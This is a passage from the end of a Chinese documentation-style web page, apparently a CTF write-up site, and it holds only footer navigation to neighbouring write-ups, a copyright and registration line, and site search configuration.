</code></pre></div> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=页脚> <a href=../SHELLCTF2022_tea/ class="md-footer__link md-footer__link--prev" aria-label="上一页: tea" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> tea </div> </div> </a> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902/ class="md-footer__link md-footer__link--next" aria-label="下一页: Misc 流量分析2" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> Misc 流量分析2 </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2022 - 3022 <span style=float:right><a href=http://beian.miit.gov.cn/ >鄂ICP备19027194号-2</a></span> </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.bd0b6b67.min.js"}</script> <script src=../../assets/javascripts/bundle.8aa65030.min.js></script> </body> </html>